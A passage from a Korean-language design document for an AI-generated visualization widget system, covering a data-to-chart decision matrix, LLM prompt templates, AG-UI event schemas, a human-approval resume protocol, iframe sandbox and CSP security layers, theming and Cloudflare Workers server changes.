  /** 계층 구조 (부모-자식) 존재 여부 */
  hasHierarchy: boolean;
  /** 그래프 구조 (노드-엣지) 존재 여부 */
  hasGraph: boolean;
  /** 수치 비교 데이터 존재 여부 */
  hasNumericComparison: boolean;
  /** 프로세스 흐름(순서/상태 전이) 존재 여부 */
  hasProcessFlow: boolean;
  /** 사용자 입력 필요 여부 */
  requiresInput: boolean;
  /** 데이터 행 수 */
  rowCount: number;
  /** 데이터 컬럼 수 */
  columnCount: number;
}

/** 데이터 특성 → 시각화 유형 매핑 룰 (우선순위 순) */
const DECISION_RULES: Array<{
  condition: (c: DataCharacteristics) => boolean;
  vizType: WidgetType;
  templateKey: string;
}> = [
  {
    condition: (c) => c.requiresInput,
    vizType: "form",
    templateKey: "input-form",
  },
  {
    condition: (c) => c.hasGraph,
    vizType: "graph",
    templateKey: "force-graph",
  },
  {
    condition: (c) => c.hasProcessFlow,
    vizType: "diagram",
    templateKey: "mermaid-flowchart",
  },
  {
    condition: (c) => c.hasHierarchy,
    vizType: "diagram",
    templateKey: "mermaid-tree",
  },
  {
    condition: (c) => c.hasTimeSeries,
    vizType: "chart",
    templateKey: "line-chart",
  },
  {
    condition: (c) => c.hasNumericComparison && c.columnCount <= 5,
    vizType: "chart",
    templateKey: "bar-chart",
  },
  {
    condition: (c) => c.hasNumericComparison && c.columnCount > 5,
    vizType: "table",
    templateKey: "heatmap-table",
  },
  {
    condition: (c) => c.rowCount > 20,
    vizType: "table",
    templateKey: "data-table",
  },
];

/** 데이터 특성 분석 → 시각화 유형 선택 */
export function selectVisualizationType(
  characteristics: DataCharacteristics,
): { vizType: WidgetType; templateKey: string } {
  for (const rule of DECISION_RULES) {
    if (rule.condition(characteristics)) {
      return { vizType: rule.vizType, templateKey: rule.templateKey };
    }
  }
  // 기본값: 마크다운 텍스트
  return { vizType: "markdown", templateKey: "text-summary" };
}

/**
 * 원시 데이터를 분석하여 DataCharacteristics를 추출한다.
 * 서버 측(svc-mcp-server)에서 호출하여 LLM 프롬프트에 포함할 시각화 유형을 결정한다.
 */
export function analyzeDataCharacteristics(
  data: Record<string, unknown>[],
  metadata: { entityType: string; relationshipCount: number },
): DataCharacteristics {
  const columns = data.length > 0 ? Object.keys(data[0] ?? {}) : [];
  const hasDateColumn = columns.some(
    (c) => c.includes("date") || c.includes("Date") || c.includes("time") || c.includes("At"),
  );
  const hasParentRef = columns.some(
    (c) => c.includes("parent") || c.includes("broader") || c.includes("parent_id"),
  );

  return {
    hasTimeSeries: hasDateColumn,
    hasHierarchy: hasParentRef,
    hasGraph: metadata.relationshipCount > 0,
    hasNumericComparison: columns.some((c) => {
      const sample = data[0]?.[c];
      return typeof sample === "number";
    }),
    hasProcessFlow: columns.some(
      (c) => c.includes("status") || c.includes("stage") || c.includes("step"),
    ),
    requiresInput: false,
    rowCount: data.length,
    columnCount: columns.length,
  };
}

/**
 * 시각화 유형에 맞는 LLM 프롬프트를 생성한다.
 * svc-mcp-server에서 svc-llm-router를 호출할 때 사용한다.
 */
export function generateVisualizationPrompt(
  templateKey: string,
  data: unknown,
  themeHint: "light" | "dark",
): string {
  const basePrompt = `You are a data visualization expert.
Generate a complete HTML document with inline CSS and SVG/JavaScript for the following data.

Rules:
- Use ONLY inline styles and scripts (no external resources)
- Use CSS variables: var(--aif-primary), var(--aif-bg), var(--aif-text), var(--aif-accent), var(--aif-border)
- Current theme: ${themeHint}
- Make the visualization responsive (width: 100%)
- Use window.__bridge.action(name, payload) to send user interactions to the parent
- Keep total HTML under 50KB
- Use simple, readable code

`;

  const templatePrompts: Record<string, string> = {
    "force-graph": `${basePrompt}
Create an animated force-directed graph using inline SVG and JavaScript.
Nodes should be circles with labels. Edges should be lines with optional labels.
Add zoom/pan via mouse. Highlight connected nodes on hover.
Data:
${JSON.stringify(data, null, 2)}`,

    "mermaid-flowchart": `${basePrompt}
Create a Mermaid flowchart diagram. Output a <div class="mermaid"> block.
The Mermaid library will be injected separately.
Data:
${JSON.stringify(data, null, 2)}`,

    "mermaid-tree": `${basePrompt}
Create a Mermaid graph TD (top-down tree) diagram showing hierarchy.
The Mermaid library will be injected separately.
Data:
${JSON.stringify(data, null, 2)}`,

    "line-chart": `${basePrompt}
Create an SVG line chart with axes, grid lines, and data points.
Add tooltip on hover showing exact values.
Data:
${JSON.stringify(data, null, 2)}`,

    "bar-chart": `${basePrompt}
Create an SVG bar chart with labeled axes and value labels on each bar.
Add hover effects.
Data:
${JSON.stringify(data, null, 2)}`,

    "heatmap-table": `${basePrompt}
Create an HTML table with color-coded cells (heatmap style).
Use the color scale from var(--aif-bg) (low) to var(--aif-accent) (high).
Data:
${JSON.stringify(data, null, 2)}`,

    "data-table": `${basePrompt}
Create a sortable HTML table with alternating row colors.
Add column header click-to-sort functionality with inline JavaScript.
Data:
${JSON.stringify(data, null, 2)}`,

    "text-summary": `${basePrompt}
Create a styled HTML summary card with key metrics highlighted.
Use semantic HTML (h2, p, ul, table).
Data:
${JSON.stringify(data, null, 2)}`,
  };

  return templatePrompts[templateKey] ?? templatePrompts["text-summary"]!;
}
```

---

## 4. AG-UI Protocol

### 4.1 이벤트 타입 정의 (Zod Schemas)

`@ai-foundry/types`에 추가할 AG-UI 이벤트 스키마.

```typescript
// packages/types/src/agent-ui.ts (신규)

import { z } from "zod";

// ── Base Event ─────────────────────────────────────────

export const AgUiEventBaseSchema = z.object({
  type: z.string(),
  timestamp: z.number(),
  runId: z.string(),
});

// ── Individual Events ──────────────────────────────────

export const RunStartedEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("RUN_STARTED"),
  agentName: z.string(),
  taskDescription: z.string(),
});

export const TextMessageContentEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("TEXT_MESSAGE_CONTENT"),
  delta: z.string(),
});

export const ToolCallStartEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("TOOL_CALL_START"),
  toolCallId: z.string(),
  toolName: z.string(),
  args: z.record(z.unknown()),
});

export const ToolCallEndEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("TOOL_CALL_END"),
  toolCallId: z.string(),
  result: z.unknown(),
});

export const StateSyncEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("STATE_SYNC"),
  widgetHtml: z.string(),
  visualizationType: z.enum(["chart", "graph", "diagram", "table", "form", "markdown"]),
});

export const HitlComponentTypeSchema = z.enum([
  "PolicyApprovalCard",
  "EntityConfirmation",
  "ParameterInput",
]);

export const HitlRequestEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("CUSTOM"),
  subType: z.literal("HITL_REQUEST"),
  componentType: HitlComponentTypeSchema,
  props: z.record(z.unknown()),
  resumeToken: z.string(),
});

export const RunFinishedEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("RUN_FINISHED"),
  summary: z.string(),
});

export const RunErrorEventSchema = AgUiEventBaseSchema.extend({
  type: z.literal("RUN_ERROR"),
  error: z.string(),
});

// ── Discriminated Union ────────────────────────────────

export const AgUiEventSchema = z.discriminatedUnion("type", [
  RunStartedEventSchema,
  TextMessageContentEventSchema,
  ToolCallStartEventSchema,
  ToolCallEndEventSchema,
  StateSyncEventSchema,
  HitlRequestEventSchema,
  RunFinishedEventSchema,
  RunErrorEventSchema,
]);

export type AgUiEvent = z.infer<typeof AgUiEventSchema>;
export type RunStartedEvent = z.infer<typeof RunStartedEventSchema>;
export type TextMessageContentEvent = z.infer<typeof TextMessageContentEventSchema>;
export type ToolCallStartEvent = z.infer<typeof ToolCallStartEventSchema>;
export type ToolCallEndEvent = z.infer<typeof ToolCallEndEventSchema>;
export type StateSyncEvent = z.infer<typeof StateSyncEventSchema>;
export type HitlRequestEvent = z.infer<typeof HitlRequestEventSchema>;
export type RunFinishedEvent = z.infer<typeof RunFinishedEventSchema>;
export type RunErrorEvent = z.infer<typeof RunErrorEventSchema>;
export type HitlComponentType = z.infer<typeof HitlComponentTypeSchema>;

// ── Request/Response Types ─────────────────────────────

export const AgentRunRequestSchema = z.object({
  /** 에이전트에게 전달할 작업 설명 */
  task: z.string().min(1).max(2000),
  /** 대상 조직 ID */
  organizationId: z.string(),
  /** 선택적 Skill ID (특정 Skill 컨텍스트에서 실행) */
  skillId: z.string().optional(),
  /** 추가 파라미터 */
  params: z.record(z.unknown()).optional(),
});

export type AgentRunRequest = z.infer<typeof AgentRunRequestSchema>;

export const HitlResponseSchema = z.object({
  /** PolicyApprovalCard 결정 */
  decision: z.object({
    action: z.enum(["approved", "rejected", "modified"]),
    comment: z.string(),
    modifications: z.record(z.string()).optional(),
  }).optional(),
  /** EntityConfirmation 선택 */
  selectedEntity: z.string().optional(),
  /** ParameterInput 응답 */
  parameters: z.record(z.string()).optional(),
});

export type HitlResponse = z.infer<typeof HitlResponseSchema>;

export const AgentResumeRequestSchema = z.object({
  runId: z.string(),
  resumeToken: z.string(),
  response: HitlResponseSchema,
});

export type AgentResumeRequest = z.infer<typeof AgentResumeRequestSchema>;
```

### 4.2 SSE 형식

```
event: RUN_STARTED
data: {"type":"RUN_STARTED","timestamp":1711000000,"runId":"run_abc123","agentName":"policy-analyzer","taskDescription":"퇴직연금 중도인출 정책 의존성 분석"}

event: TEXT_MESSAGE_CONTENT
data: {"type":"TEXT_MESSAGE_CONTENT","timestamp":1711000001,"runId":"run_abc123","delta":"퇴직연금 도메인에서 "}

event: TEXT_MESSAGE_CONTENT
data: {"type":"TEXT_MESSAGE_CONTENT","timestamp":1711000002,"runId":"run_abc123","delta":"관련 정책을 조회합니다..."}

event: TOOL_CALL_START
data: {"type":"TOOL_CALL_START","timestamp":1711000003,"runId":"run_abc123","toolCallId":"tc_001","toolName":"query-policies","args":{"domain":"pension","status":"approved"}}

event: TOOL_CALL_END
data: {"type":"TOOL_CALL_END","timestamp":1711000005,"runId":"run_abc123","toolCallId":"tc_001","result":{"count":47}}

event: STATE_SYNC
data: {"type":"STATE_SYNC","timestamp":1711000008,"runId":"run_abc123","widgetHtml":"<svg>...</svg>","visualizationType":"graph"}

event: CUSTOM
data: {"type":"CUSTOM","timestamp":1711000010,"runId":"run_abc123","subType":"HITL_REQUEST","componentType":"PolicyApprovalCard","props":{"policyCode":"POL-PENSION-WD-HOUSING-001","title":"주택 구입 중도인출","condition":"...","criteria":"...","outcome":"...","trustScore":0.87,"sourceDocument":"IRP규약_v3.2.pdf","reasoning":"..."},"resumeToken":"resume_xyz789"}

event: RUN_FINISHED
data: {"type":"RUN_FINISHED","timestamp":1711000015,"runId":"run_abc123","summary":"47건 분석, 1건 승인"}

```

### 4.3 Resume Protocol

```
┌─ Client ──────────────────────────────────────────────────┐
│                                                            │
│  1. SSE 수신: CUSTOM/HITL_REQUEST (resumeToken 포함)       │
│  2. HITL 컴포넌트 렌더링 (PolicyApprovalCard 등)           │
│  3. 사용자 입력 수집                                       │
│  4. POST /agent/resume                                    │
│     Body: { runId, resumeToken, response: {...} }          │
│                                                            │
└──────────────────────────────┬─────────────────────────────┘
                               │
                               ▼
┌─ svc-mcp-server ─────────────────────────────────────────┐
│                                                            │
│  5. AgentSessionDO.resume(resumeToken, response)           │
│     → DO가 보관 중인 에이전트 실행 컨텍스트 복원           │
│     → 사용자 응답을 다음 도구 호출의 입력으로 전달          │
│  6. 에이전트 실행 재개 → SSE 이벤트 계속 전송              │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

**resumeToken 생성 규칙**:
- 형식: `resume_{runId}_{hitlStepIndex}_{randomSuffix}`
- DO에서 발급하며, 1회 사용 후 무효화
- 유효 기간: 30분 (DO alarm으로 타임아웃 관리)

---

## 5. Security Model

### 5.1 iframe 보안 계층 (5-Layer)

```
┌───────────────────────────────────────────────────────────┐
│ L1: iframe sandbox 속성                                    │
│   sandbox="allow-scripts"                                  │
│   ❌ allow-same-origin (부모 DOM/쿠키/스토리지 접근 차단)   │
│   ❌ allow-forms (폼 제출 차단)                            │
│   ❌ allow-popups (팝업 차단)                              │
│   ❌ allow-top-navigation (부모 URL 변경 차단)             │
│                                                            │
├───────────────────────────────────────────────────────────┤
│ L2: CSP 메타 태그 (iframe 내부)                            │
│   default-src 'none';                                      │
│   script-src 'unsafe-inline';  ← 인라인 JS만 허용         │
│   style-src 'unsafe-inline';   ← 인라인 CSS만 허용        │
│   img-src data: blob:;         ← 인라인 이미지만 허용      │
│   font-src data:;              ← 인라인 폰트만 허용        │
│   ❌ connect-src (fetch/XHR/WebSocket 완전 차단)           │
│   ❌ frame-src (중첩 iframe 차단)                          │
│                                                            │
├───────────────────────────────────────────────────────────┤
│ L3: postMessage 검증                                       │
│   - iframe → parent: BridgeActionSchema.safeParse()        │
│   - event.source === iframeRef.contentWindow 검증          │
│   - sandbox iframe의 origin은 'null' (문자열)              │
│   - unknown 메시지는 무시 (safeParse 실패 시 drop)         │
│                                                            │
├───────────────────────────────────────────────────────────┤
│ L4: 콘텐츠 사전 검증 (srcdoc 주입 전)                      │
│   - HTML 크기 제한: 50KB (초과 시 거부)                    │
│   - <meta http-equiv="refresh"> 태그 제거                  │
│   - <base> 태그 제거                                       │
│   - on* 이벤트 핸들러 중 window.open/location 패턴 제거    │
│   ※ <script> 태그는 allow-scripts로 인해 허용 — CSP로 제어│
│                                                            │
├───────────────────────────────────────────────────────────┤
│ L5: 리소스 제한                                            │
│   - maxHeight: 600px (기본), maxWidth: 100%               │
│   - iframe 외부 overflow: hidden                          │
│   - 5초 이내 'ready' 메시지 미수신 시 타임아웃 표시        │
│                                                            │
└───────────────────────────────────────────────────────────┘
```

### 5.2 CSP 정책 유형별 분기

```typescript
function getCSPPolicy(type: WidgetType): string {
  const base = "default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:;";

  switch (type) {
    case "chart":
    case "graph":
    case "table":
      // D3.js SVG 생성에 인라인 스크립트 필요
      return `${base} script-src 'unsafe-inline';`;

    case "diagram":
      // Mermaid.js 실행에 인라인 스크립트 필요
      return `${base} script-src 'unsafe-inline';`;

    case "markdown":
      // 스크립트 불필요 — CSS만
      return `${base}`;

    case "form":
      // HITL 폼은 React 컴포넌트로 렌더링 (iframe 미사용)
      return base;

    default:
      return base;
  }
}
```

### 5.3 콘텐츠 사전 검증 함수

```typescript
/** AI 생성 HTML을 srcdoc에 주입하기 전에 위험 요소를 제거한다 */
function sanitizeWidgetContent(html: string): { sanitized: string; warnings: string[] } {
  const warnings: string[] = [];
  let sanitized = html;

  // 크기 제한
  if (new Blob([html]).size > 50_000) {
    return { sanitized: "", warnings: ["Content exceeds 50KB limit"] };
  }

  // <meta http-equiv="refresh"> 제거
  sanitized = sanitized.replace(/<meta[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*>/gi, () => {
    warnings.push("Removed meta refresh tag");
    return "";
  });

  // <base> 태그 제거
  sanitized = sanitized.replace(/<base[^>]*>/gi, () => {
    warnings.push("Removed base tag");
    return "";
  });

  // window.open, window.location 패턴 제거
  sanitized = sanitized.replace(/window\.(open|location)\s*[=(]/g, (match) => {
    warnings.push(`Removed ${match}`);
    return "/* blocked */void(";
  });

  return { sanitized, warnings };
}
```

---

## 6. Theme System

### 6.1 CSS 변수 네이밍 규칙

모든 테마 변수는 `--aif-` 접두사를 사용하여 호스트 앱의 CSS 변수와 충돌을 방지한다.

| 변수명 | Light 값 | Dark 값 | 용도 |
|--------|----------|---------|------|
| `--aif-primary` | `#1A365D` | `#90CDF4` | 주요 색상 (제목, 강조 테두리) |
| `--aif-bg` | `#FFFFFF` | `#1A202C` | 배경색 |
| `--aif-bg-secondary` | `#F7FAFC` | `#2D3748` | 보조 배경 (카드, 행) |
| `--aif-text` | `#1A202C` | `#E2E8F0` | 본문 텍스트 |
| `--aif-text-secondary` | `#718096` | `#A0AEC0` | 보조 텍스트 |
| `--aif-accent` | `#F6AD55` | `#ED8936` | 강조색 (차트 포인트, 배지) |
| `--aif-success` | `#48BB78` | `#68D391` | 성공/승인 |
| `--aif-danger` | `#F56565` | `#FC8181` | 에러/반려 |
| `--aif-border` | `#E2E8F0` | `#4A5568` | 테두리 |
| `--aif-font-body` | `'Inter', sans-serif` | (동일) | 본문 폰트 |
| `--aif-font-mono` | `'IBM Plex Mono', monospace` | (동일) | 코드 폰트 |
| `--aif-radius` | `8px` | (동일) | border-radius |

### 6.2 테마 변수 시리얼라이저

```typescript
// apps/app-mockup/src/lib/widget-theme.ts (신규)

import type { ThemeVariables } from "../components/shared/WidgetRenderer";

/** 현재 ThemeProvider 상태에서 iframe용 ThemeVariables를 추출한다 */
export function extractThemeVariables(isDark: boolean): ThemeVariables {
  return {
    "--aif-primary": isDark ? "#90CDF4" : "#1A365D",
    "--aif-bg": isDark ? "#1A202C" : "#FFFFFF",
    "--aif-bg-secondary": isDark ? "#2D3748" : "#F7FAFC",
    "--aif-text": isDark ? "#E2E8F0" : "#1A202C",
    "--aif-text-secondary": isDark ? "#A0AEC0" : "#718096",
    "--aif-accent": isDark ? "#ED8936" : "#F6AD55",
    "--aif-success": isDark ? "#68D391" : "#48BB78",
    "--aif-danger": isDark ? "#FC8181" : "#F56565",
    "--aif-border": isDark ? "#4A5568" : "#E2E8F0",
    "--aif-font-body": "'Inter', system-ui, sans-serif",
    "--aif-font-mono": "'IBM Plex Mono', 'Fira Code', monospace",
    "--aif-radius": "8px",
  };
}

/** ThemeVariables를 CSS :root 선언 문자열로 변환한다 */
export function buildThemeStyle(vars: ThemeVariables, isDark: boolean): string {
  const cssVars = Object.entries(vars)
    .map(([key, value]) => `  ${key}: ${value};`)
    .join("\n");

  return `
:root {
${cssVars}
}

body {
  background: var(--aif-bg);
  color: var(--aif-text);
  font-family: var(--aif-font-body);
  margin: 0;
  padding: 8px;
  line-height: 1.6;
}

${isDark ? "html { color-scheme: dark; }" : ""}
`;
}
```

### 6.3 실시간 테마 동기화

```
테마 변경 시 (사용자가 다크 모드 토글):

1. ThemeProvider.toggleTheme() 호출
2. isDark 상태 변경
3. WidgetRenderer가 새 themeVariables + isDark를 수신
4. 방법 A (srcdoc 재생성): srcdoc 전체를 새 테마로 재조립
   → 장점: 확실한 적용 / 단점: 위젯 상태 리셋
5. 방법 B (postMessage): iframe에 테마 업데이트 메시지 전송
   → 장점: 위젯 상태 유지 / 단점: Bridge 스크립트 의존

선택: 방법 B를 기본으로 사용. 위젯이 ready 상태가 아니면 방법 A로 fallback.
```

**방법 B — postMessage 기반 테마 동기화**:

```typescript
// WidgetRenderer 내부
useEffect(() => {
  if (!iframeRef.current?.contentWindow) return;
  if (!isReady) return; // Bridge 'ready' 메시지 수신 전에는 전송하지 않음

  iframeRef.current.contentWindow.postMessage(
    {
      type: "theme-update",
      variables: themeVariables,
      isDark,
    },
    "*", // sandbox iframe이므로 origin은 'null'
  );
}, [themeVariables, isDark, isReady]);
```

**Bridge 스크립트 테마 수신부**:

```javascript
// BRIDGE_SCRIPT 내 추가
window.addEventListener('message', function(event) {
  if (event.data && event.data.type === 'theme-update') {
    var vars = event.data.variables;
    var root = document.documentElement;
    for (var key in vars) {
      root.style.setProperty(key, vars[key]);
    }
    if (event.data.isDark) {
      root.classList.add('dark');
    } else {
      root.classList.remove('dark');
    }
  }
});
```

---

## 7. Server-Side Changes

### 7.1 svc-mcp-server 확장

기존 MCP endpoint(`POST /mcp/:skillId`)는 변경하지 않고, AG-UI 전용 endpoint를 추가한다.

**신규 라우트**:

| Method | Path | Description |
|--------|------|-------------|
| POST | `/agent/run` | 에이전트 실행 → SSE 스트림 반환 |
| POST | `/agent/resume` | HITL 사용자 응답 → 에이전트 재개 |
| GET | `/agent/status/:runId` | 실행 상태 조회 (폴백용) |

### 7.2 `/agent/run` 엔드포인트 설계

```typescript
// services/svc-mcp-server/src/routes/agent-run.ts (신규)

import type { Env } from "../env.js";
import { AgentRunRequestSchema, type AgUiEvent } from "@ai-foundry/types";

/**
 * POST /agent/run
 *
 * Body: AgentRunRequest
 * Response: SSE stream (text/event-stream)
 *
 * 1. 요청 검증
 * 2. AgentSessionDO 생성 (runId 발급)
 * 3. SSE 스트리밍 시작
 * 4. 에이전트 로직 실행 (DO 내부):
 *    a. 데이터 조회 (svc-policy, svc-skill, svc-ontology)
 *    b. Decision Matrix로 시각화 유형 결정
 *    c. svc-llm-router로 시각화 HTML 생성
 *    d. HITL 필요 시 이벤트 전송 후 대기
 *    e. 완료 시 RUN_FINISHED 전송
 */
export async function handleAgentRun(
  request: Request,
  env: Env,
): Promise<Response> {
  // 인증 검사
  if (!authenticate(request, env)) {
    return new Response("Unauthorized", { status: 401 });
  }

  // 요청 파싱
  const body = await request.json();
  const parsed = AgentRunRequestSchema.safeParse(body);
  if (!parsed.success) {
    return Response.json(
      { error: "Invalid request", details: parsed.error.issues },
      { status: 400 },
    );
  }

  const runRequest = parsed.data;
  const runId = `run_${crypto.randomUUID().slice(0, 12)}`;

  // SSE 스트림 생성
  const { readable, writable } = new TransformStream();
  const writer = writable.getWriter();
  const encoder = new TextEncoder();

  // SSE 이벤트 전송 헬퍼
  async function sendEvent(event: AgUiEvent): Promise<void> {
    const sseData = `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`;
    await writer.write(encoder.encode(sseData));
  }

  // 에이전트 로직을 비동기로 실행 (ctx.waitUntil 패턴)
  const agentPromise = executeAgentRun(env, runId, runRequest, sendEvent)
    .catch(async (err) => {
      await sendEvent({
        type: "RUN_ERROR",
        timestamp: Date.now(),
        runId,
        error: String(err),
      });
    })
    .finally(() => writer.close());

  // Workers에서 스트림이 완료될 때까지 유지
  // ctx.waitUntil(agentPromise) — fetch handler에서 호출

  return new Response(readable, {
    status: 200,
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      Connection: "keep-alive",
      ...corsHeaders(),
    },
  });
}
```

### 7.3 AgentSessionDO (Durable Object)

HITL 중단/재개를 위한 에이전트 세션 상태를 관리하는 Durable Object.

```typescript
// services/svc-mcp-server/src/agent-session-do.ts (신규)

export interface AgentSessionState {
  runId: string;
  status: "running" | "paused_hitl" | "completed" | "error";
  task: string;
  organizationId: string;
  /** 현재 대기 중인 HITL 요청 */
  pendingHitl: {
    resumeToken: string;
    componentType: string;
    props: Record<string, unknown>;
    /** 에이전트 실행 컨텍스트 (다음 단계 정보) */
    nextStepContext: Record<string, unknown>;
  } | null;
  /** 에이전트 실행 중 수집된 결과 */
  collectedResults: Record<string, unknown>[];
  createdAt: number;
  updatedAt: number;
}

export class AgentSessionDO implements DurableObject {
  private state: DurableObjectState;
  private env: Env;

  constructor(state: DurableObjectState, env: Env) {
    this.state = state;
    this.env = env;
  }

  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);

    if (url.pathname === "/resume" && request.method === "POST") {
      return this.handleResume(request);
    }

    if (url.pathname === "/status" && request.method === "GET") {
      return this.handleStatus();
    }

    return new Response("Not Found", { status: 404 });
  }

  private async handleResume(request: Request): Promise<Response> {
    const body = (await request.json()) as {
      resumeToken: string;
      response: Record<string, unknown>;
    };

    const session = await this.state.storage.get<AgentSessionState>("session");
    if (!session || session.status !== "paused_hitl") {
      return Response.json({ error: "No pending HITL request" }, { status: 400 });
    }

    if (session.pendingHitl?.resumeToken !== body.resumeToken) {
      return Response.json({ error: "Invalid resume token" }, { status: 403 });
    }

    // HITL 응답 저장
    await this.state.storage.put("hitl_response", body.response);

    // 상태 업데이트
    session.status = "running";
    session.pendingHitl = null;
    session.updatedAt = Date.now();
    await this.state.storage.put("session", session);

    return Response.json({ ok: true });
  }

  private async handleStatus(): Promise<Response> {
    const session = await this.state.storage.get<AgentSessionState>("session");
    return Response.json(session ?? { status: "not_found" });
  }
}
```

### 7.4 wrangler.toml 변경 사항

```toml
# services/svc-mcp-server/wrangler.toml 추가 내용

# 기존 SVC_SKILL binding 유지

# 신규 service bindings (에이전트 실행용)
[[services]]
binding = "SVC_POLICY"
service = "svc-policy"

[[services]]
binding = "SVC_ONTOLOGY"
service = "svc-ontology"

[[services]]
binding = "SVC_LLM_ROUTER"
service = "svc-llm-router"

# Durable Object binding (에이전트 세션)
[durable_objects]
bindings = [
  { name = "AGENT_SESSION", class_name = "AgentSessionDO" }
]

[[migrations]]
tag = "v1"
new_classes = ["AgentSessionDO"]

# Production environment 추가
[env.production]
# ... 기존 vars ...

[[env.production.services]]
binding = "SVC_POLICY"
service = "svc-policy-production"

[[env.production.services]]
binding = "SVC_ONTOLOGY"
service = "svc-ontology-production"

[[env.production.services]]
binding = "SVC_LLM_ROUTER"
service = "svc-llm-router-production"

[env.production.durable_objects]
bindings = [
  { name = "AGENT_SESSION", class_name = "AgentSessionDO", script_name = "svc-mcp-server-production" }
]
```

### 7.5 Env 타입 확장

```typescript
// services/svc-mcp-server/src/env.ts 확장

export interface Env {
  // 기존
  SVC_SKILL: Fetcher;
  ENVIRONMENT: string;
  SERVICE_NAME: string;
  INTERNAL_API_SECRET: string;

  // 신규 — AG-UI 에이전트 실행용
  SVC_POLICY: Fetcher;
  SVC_ONTOLOGY: Fetcher;
  SVC_LLM_ROUTER: Fetcher;
  AGENT_SESSION: DurableObjectNamespace;
}
```

---

## 8. Data Models

### 8.1 신규 타입 정의 파일 구조

```
packages/types/src/
├── agent-ui.ts        (신규) — AG-UI 이벤트 + AgentRunRequest + HitlResponse
├── events.ts          (기존) — Pipeline Queue 이벤트 (변경 없음)
├── index.ts           (수정) — agent-ui.ts export 추가
└── ...
```

### 8.2 Widget 관련 타입 (프론트엔드 전용)

```typescript
// apps/app-mockup/src/types/widget.ts (신규)

/** Widget Renderer에서 사용하는 라이브러리 번들 유형 */
export type WidgetLibrary = "d3-subset" | "mermaid" | "none";

/** Widget 라이브러리 → WidgetType 매핑 */
export const WIDGET_LIBRARY_MAP: Record<string, WidgetLibrary> = {
  chart: "d3-subset",
  graph: "d3-subset",
  diagram: "mermaid",
  table: "none",
  form: "none",
  markdown: "none",
};

/** 인라인 라이브러리 번들 (빌드 시 문자열로 번들링) */
export interface LibraryBundle {
  name: WidgetLibrary;
  /** 인라인 JavaScript 코드 */
  script: string;
  /** 번들 크기 (bytes, 모니터링용) */
  sizeBytes: number;
}
```

### 8.3 전체 타입 관계 다이어그램

```
                    @ai-foundry/types
                    ┌──────────────────────────┐
                    │  agent-ui.ts             │
                    │  ├─ AgUiEventSchema       │ ◄── svc-mcp-server (emit)
                    │  ├─ AgentRunRequestSchema │ ◄── Frontend (send)
                    │  ├─ HitlResponseSchema    │ ◄── Frontend (send)
                    │  └─ AgentResumeRequestSchema│◄── Frontend (send)
                    └──────────────────────────┘
                              │
                   ┌──────────┴──────────┐
                   ▼                     ▼
          app-mockup (Frontend)   svc-mcp-server (Backend)
          ┌──────────────────┐   ┌──────────────────────┐
          │ types/widget.ts  │   │ agent-session-do.ts   │
          │ ├─ WidgetType    │   │ ├─ AgentSessionState  │
          │ ├─ ThemeVariables│   │ └─ AgentSessionDO     │
          │ └─ BridgeAction  │   │                      │
          │                  │   │ routes/agent-run.ts   │
          │ AgentStreamState │   │ ├─ handleAgentRun()   │
          │ (Context 내부)   │   │ └─ executeAgentRun()  │
          └──────────────────┘   └──────────────────────┘
```

---

## 9. Implementation Order

### 9.1 단계별 구현 순서

```
Step 1: 공유 타입 정의 (0.5 세션)
  ├─ packages/types/src/agent-ui.ts 생성
  ├─ AG-UI 이벤트 스키마 + Request/Response 타입
  └─ packages/types/src/index.ts에 export 추가

Step 2: Widget Renderer 코어 (1 세션)
  ├─ apps/app-mockup/src/components/shared/WidgetRenderer.tsx
  ├─ apps/app-mockup/src/lib/widget-theme.ts
  ├─ Bridge 스크립트 + CSP 정책 + 콘텐츠 검증
  └─ 기본 테스트 (정적 HTML 렌더링)

Step 3: Decision Matrix (0.5 세션)
  ├─ apps/app-mockup/src/lib/decision-matrix.ts
  ├─ analyzeDataCharacteristics()
  ├─ selectVisualizationType()
  └─ generateVisualizationPrompt() 템플릿

Step 4: Demo 5 — Generative Visualization (1 세션)
  ├─ apps/app-mockup/src/pages/demo/generative/ 디렉토리
  ├─ Widget Renderer + Decision Matrix 통합
  ├─ 정적 데이터로 3가지 시각화 유형 데모
  └─ 테마 동기화 검증

Step 5: AG-UI Server Adapter (1 세션)
  ├─ services/svc-mcp-server/src/routes/agent-run.ts
  ├─ SSE 스트리밍 핸들러
  ├─ wrangler.toml service binding 추가
  └─ Env 타입 확장

Step 6: AgentSessionDO (1 세션)
  ├─ services/svc-mcp-server/src/agent-session-do.ts
  ├─ HITL 상태 보존 + resume 프로토콜
  ├─ DO migration 설정
  └─ /agent/resume 엔드포인트

Step 7: AG-UI Client (1 세션)
  ├─ apps/app-mockup/src/contexts/AgentStreamContext.tsx
  ├─ apps/app-mockup/src/lib/agent-stream.ts (SSE 파서)
  └─ useAgentStreamContext() hook

Step 8: AgentRunPanel + HITL 컴포넌트 (1 세션)
  ├─ apps/app-mockup/src/components/shared/AgentRunPanel.tsx
  ├─ PolicyApprovalCard.tsx
  ├─ EntityConfirmation.tsx
  ├─ ParameterInput.tsx
  └─ Demo 5에 통합

Step 9: app-web 통합 (1-2 세션)
  ├─ 공통 패키지 추출 검토 (packages/generative-ui/ 또는 직접 복사)
  ├─ Dashboard, Analysis Report, Ontology 페이지에 Widget Renderer 탑재
  └─ 기존 HITL 워크플로우와 AG-UI Resume 연결

Step 10: 보안 테스트 + 최적화 (0.5 세션)
  ├─ XSS 공격 벡터 테스트 (3가지 시나리오)
  ├─ CSP 정책 검증
  └─ 성능 프로파일링 (Widget 초기 렌더링 < 500ms)
```

### 9.2 핵심 파일 목록

| 파일 | 상태 | 설명 |
|------|------|------|
| `packages/types/src/agent-ui.ts` | 신규 | AG-UI 이벤트 Zod 스키마 + 타입 |
| `packages/types/src/index.ts` | 수정 | agent-ui export 추가 |
